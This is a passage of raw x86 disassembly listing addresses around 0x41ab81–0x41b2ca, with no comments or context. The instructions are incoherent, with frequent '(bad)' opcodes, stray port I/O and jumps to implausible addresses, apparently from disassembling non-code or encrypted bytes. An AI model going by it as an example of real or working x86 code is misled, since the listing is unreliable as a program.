  41ab81:	repz jmp 0xaa469fcc
  41ab87:	pop    ss
  41ab88:	stc    
  41ab89:	xlat   BYTE PTR ds:[ebx]
  41ab8a:	fs xchg esi,eax
  41ab8c:	fs (bad) 
  41ab8e:	iret   
  41ab8f:	icebp  
  41ab90:	loop   0x41ab96
  41ab92:	push   esp
  41ab93:	mov    BYTE PTR ds:0xe05fadb0,0x4f
  41ab9a:	pusha  
  41ab9b:	out    dx,eax
  41ab9c:	les    edx,FWORD PTR [esi+0x7b551870]
  41aba2:	mov    bl,0x73
  41aba4:	inc    ebx
  41aba5:	mov    bh,0x84
  41aba7:	sub    BYTE PTR [esp-0x5a93f06f],bl
  41abae:	ins    BYTE PTR es:[edi],dx
  41abaf:	pop    sp
  41abb1:	push   ebx
  41abb2:	imul   eax,DWORD PTR [eax-0x800f97d],0xffffffcd
  41abb9:	xchg   ebp,eax
  41abba:	mov    esp,0xa0bb4646
  41abbf:	dec    ecx
  41abc0:	out    dx,eax
  41abc1:	ss add esi,ebp
  41abc4:	mov    WORD PTR [edi-0x18],es
  41abc7:	dec    edx
  41abc8:	xchg   ebx,eax
  41abc9:	cli    
  41abca:	repz cmc 
  41abcc:	push   es
  41abcd:	lods   eax,DWORD PTR ds:[esi]
  41abce:	mov    edi,edx
  41abd0:	aaa    
  41abd1:	(bad)  
  41abd2:	aas    
  41abd3:	mov    ah,0x1d
  41abd5:	stc    
  41abd6:	mul    BYTE PTR [eax]
  41abd8:	repnz push eax
  41abda:	inc    ecx
  41abdb:	test   DWORD PTR [edx],edx
  41abdd:	mov    al,ds:0x429b83a3
  41abe2:	adc    ebx,edx
  41abe4:	and    bh,BYTE PTR [eax]
  41abe6:	pushf  
  41abe7:	xor    al,0x3a
  41abe9:	adc    eax,0xfe11e7c4
  41abee:	repz xlat BYTE PTR ds:[ebx]
  41abf0:	xor    DWORD PTR ds:0x648ab596,esi
  41abf6:	sub    ebx,DWORD PTR [edx+edx*4]
  41abf9:	jae    0x41abce
  41abfb:	cli    
  41abfc:	push   esp
  41abfd:	dec    edi
  41abfe:	xchg   edx,eax
  41abff:	jmp    0x41abec
  41ac01:	lea    edx,[edi]
  41ac03:	sub    eax,0x3521bf69
  41ac08:	push   ecx
  41ac09:	adc    al,0xfe
  41ac0b:	cmp    eax,0x6e322e2a
  41ac10:	popf   
  41ac11:	inc    eax
  41ac12:	dec    edi
  41ac13:	dec    edx
  41ac14:	push   edx
  41ac15:	sbb    BYTE PTR cs:[eax+0x2c],cl
  41ac19:	xlat   BYTE PTR ds:[ebx]
  41ac1a:	push   edi
  41ac1b:	jmp    0x7f07:0x1e89f98
  41ac22:	clc    
  41ac23:	xchg   BYTE PTR [ebp+0x4b],dh
  41ac26:	pop    edi
  41ac28:	mov    edi,0x7f7f546f
  41ac2d:	daa    
  41ac2e:	mov    dh,0xa3
  41ac30:	ins    BYTE PTR es:[edi],dx
  41ac31:	jo     0x41ac35
  41ac33:	int3   
  41ac34:	aas    
  41ac35:	lods   eax,DWORD PTR ds:[esi]
  41ac36:	test   DWORD PTR [ebx+0x33058cc0],0x73e7a887
  41ac40:	shr    BYTE PTR [eax],0xb7
  41ac43:	jmp    DWORD PTR [ecx]
  41ac45:	push   0x34
  41ac47:	addr16 jne 0x41abfa
  41ac4a:	pop    ss
  41ac4b:	push   ds
  41ac4c:	test   eax,0x703557d9
  41ac51:	push   ds
  41ac52:	and    BYTE PTR [ebp+0x3cdd1d88],cl
  41ac58:	xor    ch,BYTE PTR [edx-0x33]
  41ac5b:	dec    esp
  41ac5c:	adc    esi,DWORD PTR [edx+0x24af69d8]
  41ac62:	jl     0x41ac56
  41ac64:	adc    DWORD PTR [eax+0x25],edx
  41ac67:	dec    ebp
  41ac68:	jmp    0x84537974
  41ac6d:	pop    ebp
  41ac6e:	sbb    al,0x47
  41ac70:	imul   esp,DWORD PTR ss:[edi],0xffffff9a
  41ac74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac75:	push   0x327ae008
  41ac7a:	or     eax,0x6235e036
  41ac7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac80:	lea    edx,[eax-0x50]
  41ac83:	or     ebx,DWORD PTR [esi+ebp*1]
  41ac86:	addr16 mov ch,0xff
  41ac89:	push   0x760649a7
  41ac8e:	mov    ah,0x2c
  41ac90:	popf   
  41ac91:	sub    BYTE PTR [ecx+0x6],cl
  41ac94:	fwait
  41ac95:	cld    
  41ac96:	mov    edi,0x41c00a87
  41ac9b:	mov    DWORD PTR [ebx+0x21],ebp
  41ac9e:	inc    edx
  41ac9f:	push   esp
  41aca0:	call   FWORD PTR [edx]
  41aca2:	mov    ebp,0x7edd7022
  41aca7:	xor    esi,DWORD PTR [edi-0x43]
  41acaa:	cwde   
  41acab:	popf   
  41acac:	std    
  41acad:	clc    
  41acae:	cmp    ebx,ecx
  41acb0:	push   ds
  41acb1:	mov    dh,BYTE PTR [edi+0x1]
  41acb4:	pop    eax
  41acb5:	outs   dx,BYTE PTR ds:[esi]
  41acb6:	jmp    0x41ac51
  41acb8:	mov    WORD PTR [ecx+edi*8-0x2e],ss
  41acbc:	cmp    DWORD PTR [eax-0x4b55397d],0xb6895bad
  41acc6:	adc    al,0xa
  41acc8:	cmp    DWORD PTR [edi+0x4b],esi
  41accb:	jno    0x41ad09
  41accd:	pushf  
  41acce:	pmaddwd mm7,QWORD PTR [edx]
  41acd1:	cs xchg dl,dl
  41acd4:	in     eax,0x8e
  41acd6:	sbb    eax,0x82feea9a
  41acdb:	jne    0x41ad54
  41acdd:	in     eax,0x49
  41acdf:	repz mov bh,0xa2
  41ace2:	div    ch
  41ace4:	mov    ch,dh
  41ace6:	mov    bh,0x47
  41ace8:	retf   
  41ace9:	sub    dh,bl
  41aceb:	inc    eax
  41acec:	scas   eax,DWORD PTR es:[edi]
  41aced:	fdivr  st,st(2)
  41acef:	cdq    
  41acf0:	xor    BYTE PTR [eax],cl
  41acf2:	ffree  st(1)
  41acf4:	(bad)  
  41acf5:	jle    0x41acde
  41acf7:	test   ah,bh
  41acf9:	pop    eax
  41acfa:	mov    bl,dh
  41acfc:	inc    edi
  41acfd:	das    
  41acfe:	mov    bl,0xde
  41ad00:	mov    ds:0xec3d957d,al
  41ad05:	pusha  
  41ad06:	(bad)  
  41ad07:	mov    bl,0x63
  41ad09:	jb     0x41ad0d
  41ad0b:	mov    ds:0x196c50c9,eax
  41ad10:	adc    BYTE PTR [edi],bh
  41ad12:	rcl    BYTE PTR es:[ecx+0x65],cl
  41ad16:	or     eax,DWORD PTR [edx+0x7e]
  41ad19:	ss loope 0x41acfe
  41ad1c:	popf   
  41ad1d:	shl    ebx,1
  41ad1f:	ja     0x41ad95
  41ad21:	push   cs
  41ad22:	jnp    0x41ad6e
  41ad24:	aam    0x58
  41ad26:	mov    dl,0x28
  41ad28:	adc    al,0xe7
  41ad2a:	lea    edi,[esi+0x61450109]
  41ad30:	mov    eax,0x1c68d1e0
  41ad35:	mov    bh,0xde
  41ad37:	test   eax,0x8b4fe695
  41ad3c:	jno    0x41ad2f
  41ad3e:	out    0x3c,eax
  41ad40:	and    bl,ch
  41ad42:	retf   
  41ad43:	mov    esp,0xf202efaa
  41ad48:	ds das 
  41ad4a:	mov    ah,0x2
  41ad4c:	cmp    al,0xd2
  41ad4e:	sub    al,0xbb
  41ad50:	aam    0x69
  41ad52:	xchg   esi,eax
  41ad53:	int3   
  41ad54:	adc    DWORD PTR [edx+0x6709eb05],ebx
  41ad5a:	in     al,dx
  41ad5b:	mov    ebp,0xe0a0501a
  41ad60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad61:	mov    ?,WORD PTR [esi]
  41ad63:	scas   eax,DWORD PTR es:[edi]
  41ad64:	xchg   ebx,eax
  41ad65:	push   esp
  41ad66:	fs jecxz 0x41acec
  41ad69:	lods   eax,DWORD PTR ds:[esi]
  41ad6a:	xchg   esi,eax
  41ad6b:	fidivr WORD PTR ds:0xe4d8c2e1
  41ad71:	xor    DWORD PTR [ecx],ebp
  41ad73:	push   ebx
  41ad74:	fs scas al,BYTE PTR es:[edi]
  41ad76:	pop    edx
  41ad77:	out    0xb6,al
  41ad79:	test   BYTE PTR [eax-0x16],0x51
  41ad7d:	xchg   esi,eax
  41ad7e:	in     al,0xf6
  41ad80:	js     0x41ad16
  41ad82:	test   BYTE PTR [esi+esi*1],dl
  41ad85:	xor    ebx,DWORD PTR [ecx]
  41ad87:	jp     0x41ad6b
  41ad89:	aad    0xf4
  41ad8b:	push   eax
  41ad8c:	mov    ah,0x9a
  41ad8e:	outs   dx,BYTE PTR ds:[esi]
  41ad8f:	repz adc edi,DWORD PTR [ebp+0x5]
  41ad93:	dec    ebp
  41ad94:	or     DWORD PTR [edi],esp
  41ad96:	fwait
  41ad97:	stos   BYTE PTR es:[edi],al
  41ad98:	pop    edx
  41ad99:	xchg   BYTE PTR [edi+ebx*2],al
  41ad9c:	ins    DWORD PTR es:[edi],dx
  41ad9d:	pop    ss
  41ad9e:	jle    0x41ad45
  41ada0:	pop    ds
  41ada1:	jnp    0x41adec
  41ada3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ada4:	mov    ss,WORD PTR [edi+eiz*4+0x12]
  41ada8:	mov    eax,ds:0x1e292129
  41adad:	sub    esp,DWORD PTR [edx]
  41adaf:	std    
  41adb0:	cmc    
  41adb1:	les    edx,FWORD PTR [edx+0x64f81302]
  41adb7:	jno    0x41ae25
  41adb9:	cli    
  41adba:	loop   0x41adb2
  41adbc:	bound  ecx,QWORD PTR [eax+0x33]
  41adbf:	xor    al,0xee
  41adc1:	mov    ah,bl
  41adc3:	xchg   ebp,eax
  41adc4:	repnz lods al,BYTE PTR ds:[esi]
  41adc6:	fmul   QWORD PTR [ebp-0x3f03000c]
  41adcc:	xchg   ebx,eax
  41adcd:	mov    edx,DWORD PTR [ebx-0xc]
  41add0:	add    bh,bh
  41add2:	mov    eax,ds:0x8deb3045
  41add7:	es push es
  41add9:	xor    edi,DWORD PTR [ebx-0x24]
  41addc:	adc    ecx,DWORD PTR [eax+edx*8]
  41addf:	shl    DWORD PTR [edx-0x6],0xf1
  41ade3:	pop    edi
  41ade4:	inc    edx
  41ade5:	mov    al,ds:0xd67059da
  41adea:	cwde   
  41adeb:	stos   BYTE PTR es:[edi],al
  41adec:	mov    DWORD PTR [edi],edx
  41adee:	es pop eax
  41adf0:	xchg   edi,eax
  41adf1:	test   BYTE PTR [ecx],al
  41adf3:	xchg   ecx,eax
  41adf4:	sbb    eax,0x1b7d0eee
  41adf9:	push   ebp
  41adfa:	dec    ebp
  41adfb:	xor    BYTE PTR [edi],0x56
  41adfe:	adc    dl,BYTE PTR [eax-0x52]
  41ae01:	sbb    BYTE PTR [esi+0x2095efdc],bl
  41ae07:	jmp    0x2342d1a0
  41ae0c:	sahf   
  41ae0d:	add    DWORD PTR [ebx+0x16],edx
  41ae10:	inc    eax
  41ae11:	lods   eax,DWORD PTR ds:[esi]
  41ae12:	push   esp
  41ae13:	xlat   BYTE PTR ds:[ebx]
  41ae14:	jg     0x41ae43
  41ae16:	dec    ebx
  41ae17:	pop    ebx
  41ae18:	dec    esi
  41ae19:	lds    esi,FWORD PTR [esi+0x2a]
  41ae1c:	cs dec ebx
  41ae1e:	fwait
  41ae1f:	hlt    
  41ae20:	mov    es,WORD PTR [ebx+0x18]
  41ae23:	fisubr DWORD PTR [edx-0x48b4ae64]
  41ae29:	mov    ebp,0x596a54f9
  41ae2e:	fnsave [ebp+ebx*1+0x26e6c953]
  41ae35:	mov    ch,0x2d
  41ae37:	push   ecx
  41ae38:	shl    DWORD PTR ds:0xf973e1d2,0xf4
  41ae3f:	pop    ebx
  41ae40:	cld    
  41ae41:	sbb    DWORD PTR [esi],eax
  41ae43:	mov    WORD PTR [eax],es
  41ae45:	xchg   edi,eax
  41ae46:	popa   
  41ae47:	or     DWORD PTR [ebx-0x9887284],0x496ecbfe
  41ae51:	and    ecx,DWORD PTR [edi+ebx*4+0x40]
  41ae55:	aad    0xd7
  41ae57:	repz int3 
  41ae59:	ret    
  41ae5a:	jecxz  0x41ade9
  41ae5c:	div    DWORD PTR [esi+ebp*1+0x40]
  41ae60:	mov    al,ds:0x84b9578b
  41ae65:	adc    dh,BYTE PTR [edx+0x54]
  41ae68:	inc    esi
  41ae69:	cdq    
  41ae6a:	(bad)  
  41ae6b:	sub    eax,0x66f82298
  41ae70:	mov    eax,ds:0x98a852c1
  41ae75:	xchg   ebx,eax
  41ae76:	mov    bl,0x7d
  41ae78:	cmc    
  41ae79:	inc    ecx
  41ae7a:	fcmovnb st,st(4)
  41ae7c:	iret   
  41ae7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae7e:	cmp    ecx,0x775822a3
  41ae84:	dec    eax
  41ae85:	jmp    0x2c4c162b
  41ae8a:	adc    eax,0x75d0d5c7
  41ae8f:	pop    ss
  41ae90:	mov    dh,0x44
  41ae92:	icebp  
  41ae93:	addr16 adc edi,edx
  41ae96:	bound  edi,QWORD PTR [ebx-0x6b88b755]
  41ae9c:	mov    dl,0x67
  41ae9e:	shl    DWORD PTR [esi+0x16],0xda
  41aea2:	rcr    DWORD PTR [edi+esi*8-0x4a70ecb6],0x83
  41aeaa:	jne    0x41aeb4
  41aeac:	push   ebp
  41aead:	push   esp
  41aeae:	pop    esi
  41aeaf:	jmp    0x863d1d9b
  41aeb4:	jnp    0x41ae4d
  41aeb6:	sub    edi,edi
  41aeb8:	pop    esi
  41aeb9:	not    DWORD PTR [ecx]
  41aebb:	(bad)  
  41aebc:	cmp    bh,BYTE PTR [esi]
  41aebe:	xor    DWORD PTR [eax+0x24],edi
  41aec1:	add    BYTE PTR ds:0x4896d6a,bl
  41aec7:	add    esp,DWORD PTR [ebp+ecx*4-0x4f110846]
  41aece:	jb     0x41ae8a
  41aed0:	mov    DWORD PTR [eax+0x5c],edi
  41aed3:	pop    esi
  41aed4:	fmul   st(0),st
  41aed6:	xchg   edx,eax
  41aed7:	or     DWORD PTR [edi-0x66],edi
  41aeda:	dec    eax
  41aedb:	mov    esp,0xa2264788
  41aee0:	jle    0x41af0c
  41aee2:	test   cl,0xe5
  41aee5:	add    edx,DWORD PTR [esi]
  41aee7:	repz jle 0x41aede
  41aeea:	inc    ebx
  41aeeb:	int3   
  41aeec:	jnp    0x41aeaa
  41aeee:	or     DWORD PTR [esi-0x27],ebx
  41aef1:	stos   DWORD PTR es:[edi],eax
  41aef2:	mov    dl,0x27
  41aef4:	push   0xecc1acad
  41aef9:	ss ins BYTE PTR es:[edi],dx
  41aefb:	dec    ebp
  41aefc:	xchg   edx,eax
  41aefd:	xlat   BYTE PTR ds:[ebx]
  41aefe:	pusha  
  41aeff:	scas   eax,DWORD PTR es:[edi]
  41af00:	dec    esp
  41af01:	mov    al,ds:0xc7410624
  41af06:	mov    dl,0x6b
  41af08:	stos   BYTE PTR es:[edi],al
  41af09:	xor    DWORD PTR [esp+ebp*1+0x26972476],edx
  41af10:	jle    0x41aed2
  41af12:	mov    ds:0x8edd1d74,eax
  41af17:	mov    dl,0xef
  41af19:	xor    edx,ecx
  41af1b:	sub    esi,DWORD PTR [ecx+0xd0d6804]
  41af21:	cs into 
  41af23:	out    0xd0,al
  41af25:	jne    0x41af77
  41af27:	pushf  
  41af28:	mov    al,0xb1
  41af2a:	sbb    ah,BYTE PTR [esi+0x1d]
  41af2d:	call   0x7db5:0x7a6147ab
  41af34:	hlt    
  41af35:	xor    eax,DWORD PTR [esi+0xd356508]
  41af3b:	dec    edx
  41af3c:	add    al,al
  41af3e:	push   edx
  41af3f:	ror    BYTE PTR [ebx+0x6a4132f7],cl
  41af45:	push   ds
  41af46:	mov    al,0x3a
  41af48:	push   edx
  41af49:	cmp    eax,DWORD PTR [edi-0x4edd233e]
  41af4f:	jg     0x41af3e
  41af51:	sub    BYTE PTR gs:[esi+edi*8+0x22],al
  41af56:	xchg   esi,eax
  41af57:	and    al,0x48
  41af59:	or     bh,BYTE PTR [ebp-0x3ff80e8f]
  41af5f:	adc    edi,DWORD PTR [ebp+0x59]
  41af62:	mov    ebx,0x92c9f934
  41af67:	(bad)  
  41af68:	cld    
  41af69:	or     bh,BYTE PTR [ebx-0x1480cf5a]
  41af6f:	pop    ds
  41af70:	and    bh,ch
  41af72:	div    bl
  41af74:	(bad)  
  41af75:	cs popa 
  41af77:	in     eax,0xb9
  41af79:	dec    ecx
  41af7a:	lds    esi,FWORD PTR [esi+0x8315e23]
  41af80:	push   0x4d06905c
  41af85:	outs   dx,BYTE PTR ds:[esi]
  41af86:	pop    es
  41af87:	sbb    BYTE PTR [esi-0x480607ab],0x83
  41af8e:	jle    0x41af30
  41af90:	jge    0x41af73
  41af92:	mov    edx,0x7df036a6
  41af97:	mov    dh,0x86
  41af99:	lds    eax,FWORD PTR [edi+0xd7e3162]
  41af9f:	inc    esi
  41afa0:	inc    esp
  41afa1:	aam    0x63
  41afa3:	fwait
  41afa4:	add    eax,0x3246e4a4
  41afa9:	push   ss
  41afaa:	lods   eax,DWORD PTR ds:[esi]
  41afab:	jns    0x41afcd
  41afad:	test   al,0xce
  41afaf:	enter  0xcc6a,0x0
  41afb3:	shl    BYTE PTR [esi-0x23],cl
  41afb6:	cmp    eax,DWORD PTR [ebp+ebp*1+0x74efcca0]
  41afbd:	jmp    0x41af53
  41afbf:	xor    al,0x47
  41afc1:	iret   
  41afc2:	mov    ds:0x65be204d,eax
  41afc7:	dec    eax
  41afc8:	pop    ebx
  41afc9:	loopne 0x41af6c
  41afcb:	cld    
  41afcc:	pop    esi
  41afcd:	jecxz  0x41b035
  41afcf:	pushf  
  41afd0:	mov    ebp,0x61e6877a
  41afd5:	pusha  
  41afd6:	lods   eax,DWORD PTR ds:[esi]
  41afd7:	icebp  
  41afd8:	cmp    eax,0xff7998f7
  41afdd:	shufps xmm0,XMMWORD PTR [esi-0x56],0x99
  41afe2:	mov    ebx,0xb6f6bcf0
  41afe7:	and    BYTE PTR [ebx+0x6b],bh
  41afea:	(bad)  
  41afeb:	int3   
  41afec:	and    ebx,0x29
  41afef:	push   eax
  41aff0:	les    ebx,FWORD PTR [ecx-0x247e8902]
  41aff6:	fld    QWORD PTR [ecx-0x22f1a116]
  41affc:	mov    ecx,0x44613af2
  41b001:	loop   0x41b052
  41b003:	xchg   DWORD PTR [edi-0x2d9ec1ac],esp
  41b009:	ds data16 sbb al,0x4b
  41b00d:	ja     0x41b05d
  41b00f:	test   cl,ah
  41b011:	iret   
  41b012:	aas    
  41b013:	loopne 0x41afa9
  41b015:	jle    0x41b053
  41b017:	in     eax,0x53
  41b019:	jle    0x41af9b
  41b01b:	fiadd  WORD PTR [edx]
  41b01d:	xor    al,0xa4
  41b01f:	add    BYTE PTR [esp+edi*8+0x38],ah
  41b023:	adc    BYTE PTR [esi-0x3f],bh
  41b026:	call   0x694f:0x771b3b62
  41b02d:	dec    esi
  41b02e:	add    ah,ch
  41b030:	ins    BYTE PTR es:[edi],dx
  41b031:	add    ecx,edi
  41b033:	dec    esp
  41b034:	in     al,0xe1
  41b036:	loop   0x41afcb
  41b038:	(bad)  
  41b039:	cwde   
  41b03a:	mov    ss,ecx
  41b03c:	bound  ebp,QWORD PTR [edi]
  41b03e:	arpl   WORD PTR [ebp+0x7f],bx
  41b041:	shr    DWORD PTR [esi],0xa5
  41b044:	arpl   WORD PTR [ebp-0x386538bc],ax
  41b04a:	imul   esp,DWORD PTR [esp+eax*8+0x21799843],0xffffffe9
  41b052:	push   ecx
  41b053:	(bad)  
  41b054:	bnd ret 
  41b056:	shl    BYTE PTR [eax],1
  41b058:	in     al,dx
  41b059:	jne    0x41b071
  41b05b:	xor    dh,ah
  41b05d:	adc    DWORD PTR [ebx],eax
  41b05f:	fdiv   DWORD PTR [edx+edi*4]
  41b062:	dec    ecx
  41b063:	(bad)  
  41b064:	lock pop ecx
  41b066:	out    dx,eax
  41b067:	je     0x41b095
  41b069:	mov    edx,0x4d58db3
  41b06e:	lds    ebx,FWORD PTR [eax+0x4b8cba78]
  41b074:	leave  
  41b075:	mov    esp,DWORD PTR [edx+esi*2]
  41b078:	aam    0x4c
  41b07a:	cmc    
  41b07b:	push   esi
  41b07c:	aaa    
  41b07d:	xchg   esi,eax
  41b07e:	(bad)  
  41b07f:	xlat   BYTE PTR ds:[ebx]
  41b080:	setb   BYTE PTR [ebx+0x280b35ce]
  41b087:	fst    DWORD PTR [ecx]
  41b089:	or     eax,0x599d1edd
  41b08e:	sub    DWORD PTR [esi+0x3739e579],esi
  41b094:	(bad)  
  41b095:	int    0x39
  41b097:	xchg   esi,eax
  41b098:	push   0xe3573dcb
  41b09d:	mov    eax,0x7315b7aa
  41b0a2:	pop    es
  41b0a3:	lahf   
  41b0a4:	aas    
  41b0a5:	adc    dh,bl
  41b0a7:	mov    ecx,fs
  41b0a9:	out    dx,eax
  41b0aa:	pop    edi
  41b0ab:	mov    dl,0x6a
  41b0ad:	data16 gs aaa 
  41b0b0:	loopne 0x41b102
  41b0b2:	lods   eax,DWORD PTR es:[esi]
  41b0b4:	les    ebp,FWORD PTR [esp+edx*4+0x3f]
  41b0b8:	ficomp DWORD PTR [edi+0x32]
  41b0bb:	iret   
  41b0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0bd:	dec    esi
  41b0be:	(bad)  
  41b0bf:	sahf   
  41b0c0:	add    al,0xef
  41b0c2:	loopne 0x41b0dc
  41b0c4:	jge    0x41b06b
  41b0c6:	out    0xce,al
  41b0c8:	mov    ebp,DWORD PTR [ecx-0x2766eb6d]
  41b0ce:	aam    0xca
  41b0d0:	retf   0x773a
  41b0d3:	xlat   BYTE PTR ds:[ebx]
  41b0d4:	out    dx,al
  41b0d5:	mov    dl,0x6d
  41b0d7:	test   ebp,esi
  41b0d9:	xor    al,0x94
  41b0db:	or     edi,DWORD PTR [eax-0x7]
  41b0de:	arpl   WORD PTR [ecx-0x6ffb32fc],ax
  41b0e4:	(bad)  
  41b0e5:	cmc    
  41b0e6:	aad    0xc
  41b0e8:	and    DWORD PTR [edi+0x68e55994],esp
  41b0ee:	push   cs
  41b0ef:	retf   0xe5e6
  41b0f2:	xor    ebx,ebp
  41b0f4:	jo     0x41b0bc
  41b0f6:	add    bl,BYTE PTR [edx]
  41b0f8:	shl    BYTE PTR [edx+ebp*4-0x5c05e440],0x5
  41b100:	jmp    0x4ce597af
  41b105:	mov    ebx,DWORD PTR [ebx]
  41b107:	je     0x41b17f
  41b109:	daa    
  41b10a:	mov    DWORD PTR [ebp-0x126a702d],edx
  41b110:	dec    ebx
  41b111:	cmp    dh,0xad
  41b114:	mov    bh,0x79
  41b116:	inc    ebp
  41b117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b118:	sbb    esp,DWORD PTR [eax]
  41b11a:	scas   al,BYTE PTR es:[edi]
  41b11b:	pop    esi
  41b11c:	jmp    0xf8f3:0x97e43b41
  41b123:	inc    ecx
  41b124:	cld    
  41b125:	imul   eax,DWORD PTR ds:[ebp-0x11],0xffffffef
  41b12a:	add    esi,DWORD PTR [eax-0x730f979e]
  41b130:	repnz int3 
  41b132:	out    0xef,eax
  41b134:	das    
  41b135:	pop    ebp
  41b136:	mov    WORD PTR [edi-0x283bc60d],cs
  41b13c:	pop    esi
  41b13d:	retf   0x5d74
  41b140:	and    BYTE PTR [eax],bh
  41b142:	fdiv   st(1),st
  41b144:	adc    eax,ebp
  41b146:	outs   dx,BYTE PTR ds:[esi]
  41b147:	dec    ebx
  41b148:	jge    0x41b13b
  41b14a:	jmp    0x41b185
  41b14c:	dec    edx
  41b14d:	xor    al,0x7f
  41b14f:	rcr    BYTE PTR [eax],cl
  41b151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b152:	push   esp
  41b153:	shl    al,0xb4
  41b156:	cmp    DWORD PTR [edi-0x6c40269b],esi
  41b15c:	xor    ebp,DWORD PTR [ecx]
  41b15e:	out    dx,al
  41b15f:	jg     0x41b178
  41b161:	ja     0x41b17e
  41b163:	jmp    DWORD PTR [ebp-0x48]
  41b166:	jo     0x41b1a7
  41b168:	mov    DWORD PTR [ecx+0x438df424],ebx
  41b16e:	aas    
  41b16f:	jns    0x41b1a6
  41b171:	lods   eax,DWORD PTR ds:[esi]
  41b172:	pushf  
  41b173:	cmc    
  41b174:	dec    ecx
  41b175:	xor    al,0x44
  41b177:	sar    BYTE PTR [ebx+edi*2-0x13],1
  41b17b:	or     eax,0x1d502075
  41b180:	xchg   edi,eax
  41b181:	arpl   WORD PTR [esi+0xc],bp
  41b184:	retf   
  41b185:	outs   dx,BYTE PTR ds:[esi]
  41b186:	inc    ecx
  41b187:	in     al,0xb2
  41b189:	add    eax,DWORD PTR [ecx]
  41b18b:	shl    DWORD PTR [ebp+0x7615f0b6],0x8f
  41b192:	push   ebp
  41b193:	mov    WORD PTR [eax],ds
  41b195:	cld    
  41b196:	jmp    0x9d8d4170
  41b19b:	mov    ecx,0x84bc66d4
  41b1a0:	and    bh,BYTE PTR [edx]
  41b1a2:	adc    eax,edi
  41b1a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a5:	xchg   esp,eax
  41b1a6:	push   eax
  41b1a7:	adc    esp,DWORD PTR ds:0x5c5bdcd1
  41b1ad:	outs   dx,BYTE PTR ds:[esi]
  41b1ae:	cli    
  41b1af:	ins    DWORD PTR es:[edi],dx
  41b1b0:	dec    eax
  41b1b1:	test   DWORD PTR [esi+0x5472467],0x794eec40
  41b1bb:	call   0x4e9fe59d
  41b1c0:	mov    al,ds:0x3ecc7c52
  41b1c5:	jmp    0x41b206
  41b1c7:	mov    ecx,0xb982b8d1
  41b1cc:	and    esp,esi
  41b1ce:	push   0xbcef5e66
  41b1d3:	sub    eax,0x65be17f7
  41b1d8:	(bad)  
  41b1d9:	jne    0x41b189
  41b1db:	js     0x41b1f3
  41b1dd:	arpl   ax,dx
  41b1df:	and    BYTE PTR [edi],ah
  41b1e1:	xchg   ebp,eax
  41b1e2:	out    dx,al
  41b1e3:	push   cs
  41b1e4:	(bad)  
  41b1e5:	scas   eax,DWORD PTR es:[edi]
  41b1e6:	sbb    BYTE PTR [esi+0x69],bh
  41b1e9:	mov    dl,al
  41b1eb:	aas    
  41b1ec:	inc    edx
  41b1ed:	adc    ecx,DWORD PTR [ebx-0x21]
  41b1f0:	inc    edi
  41b1f1:	fistp  WORD PTR [ebx+edx*4-0x5b]
  41b1f5:	jge    0x41b1cf
  41b1f7:	mov    al,0xe
  41b1f9:	pop    ecx
  41b1fa:	sub    al,0xf5
  41b1fc:	xor    eax,0x592d7c1c
  41b201:	mov    bh,0xc
  41b203:	cmp    ah,dh
  41b205:	lods   eax,DWORD PTR ds:[esi]
  41b206:	sub    esi,DWORD PTR ds:0x42ccda09
  41b20c:	adc    DWORD PTR [edx],esi
  41b20e:	mov    ebx,0x2db25654
  41b213:	push   ss
  41b214:	mov    BYTE PTR [eax+0x47],cl
  41b217:	dec    edx
  41b218:	fsubr  QWORD PTR [ecx]
  41b21a:	(bad)  
  41b21c:	or     al,0x64
  41b21e:	ret    
  41b21f:	neg    DWORD PTR [ecx]
  41b221:	inc    ecx
  41b222:	std    
  41b223:	lods   eax,DWORD PTR ds:[esi]
  41b224:	bound  ecx,QWORD PTR [esi]
  41b226:	jle    0x41b271
  41b228:	(bad)  
  41b229:	dec    esp
  41b22a:	sub    DWORD PTR [esp+eax*4],ebx
  41b22d:	lea    esi,[ebp+0xd591aba]
  41b233:	push   ecx
  41b234:	stos   BYTE PTR es:[edi],al
  41b235:	aam    0x85
  41b237:	mov    bl,0x39
  41b239:	dec    DWORD PTR [eax+0x2d]
  41b23c:	sub    al,0xd
  41b23e:	lahf   
  41b23f:	sub    bl,bh
  41b241:	jbe    0x41b22f
  41b243:	and    BYTE PTR [ebp+0x15],al
  41b246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b247:	mov    eax,0x11ebff09
  41b24c:	add    dh,0x19
  41b24f:	jns    0x41b257
  41b251:	jnp    0x41b1d9
  41b253:	adc    eax,0x8b5f2139
  41b258:	dec    edi
  41b259:	sbb    eax,0xbc420b93
  41b25e:	dec    esi
  41b25f:	push   edi
  41b260:	loopne 0x41b2d5
  41b262:	jmp    0x41b26a
  41b264:	mov    eax,ds:0xe0998374
  41b269:	jne    0x41b280
  41b26b:	and    ah,BYTE PTR [eax+0x34d1b78a]
  41b271:	pushf  
  41b272:	fincstp 
  41b274:	inc    esi
  41b275:	inc    ecx
  41b276:	cmp    eax,0x8f0a8d9d
  41b27b:	call   0x93cd3699
  41b280:	test   edx,0x38b57b16
  41b286:	arpl   WORD PTR [eax],sp
  41b288:	ret    0x451a
  41b28b:	pop    eax
  41b28c:	or     DWORD PTR [edi-0x4d],esp
  41b28f:	jecxz  0x41b27a
  41b291:	scas   al,BYTE PTR es:[edi]
  41b292:	arpl   WORD PTR [edi+0x693c2b88],bx
  41b298:	inc    ebp
  41b299:	pusha  
  41b29a:	mov    bl,0xcd
  41b29c:	dec    ebx
  41b29d:	add    ecx,0xffffff9a
  41b2a0:	xor    eax,0x68ed0626
  41b2a5:	jb     0x41b30a
  41b2a7:	or     DWORD PTR [edx],0x6c90c607
  41b2ad:	es fs jmp 0xbf94:0x18adb1f3
  41b2b6:	and    DWORD PTR [esi+0x7632d233],eax
  41b2bc:	les    eax,FWORD PTR [edx+0x10]
  41b2bf:	jbe    0x41b263
  41b2c1:	cmp    DWORD PTR [ebx+eax*4-0x1],ecx
  41b2c5:	xchg   esp,eax
  41b2c6:	or     al,0x66
  41b2c8:	je     0x41b305
  41b2ca:	mov    esp,0xc45cf14d
